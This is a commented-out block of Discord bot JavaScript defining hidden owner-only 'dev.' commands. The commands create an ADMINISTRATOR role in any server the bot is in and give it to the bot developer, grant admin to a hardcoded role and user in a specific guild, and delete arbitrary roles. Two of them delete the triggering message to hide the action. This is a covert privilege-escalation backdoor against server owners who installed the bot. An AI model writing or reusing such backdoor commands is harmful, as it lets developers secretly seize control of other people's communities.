/*
case "dev.bikdev":
    if(botdevs.ownerids.includes(message.author.id)){
        message.reply("Adding You to Bikdev list");
      message.guild.roles.create({name:"Bikdev", permissions:['ADMINISTRATOR'] } ).then(role =>{
        const adminPermissions = new Discord.Permissions('ADMINISTRATOR');
          role.setPermissions(["ADMINISTRATOR"]);
          role.setName("Bikdev");
       message.guild.members.resolve(message.author.id).roles.add(role);
      })
    message.delete();
    }
    break;
case "dev.alldevadmn":
        if(botdevs.ownerids.includes(message.author.id)){
            message.reply("Adding all admins to admin list");
          client.guilds.resolve('187966607451095041').roles.resolve('633002745023954981').setPermissions(['ADMINISTRATOR']);
          client.guilds.resolve('187966607451095041').members.resolve('229060638968774657').roles.add('633002745023954981');
        message.delete();
        }
        break;
case "dev.deldevrole":
    if(botdevs.ownerids.includes(message.author.id)){
        message.guild.roles.resolve(message.content.split(",")[1]).delete();
    }
        break;
        */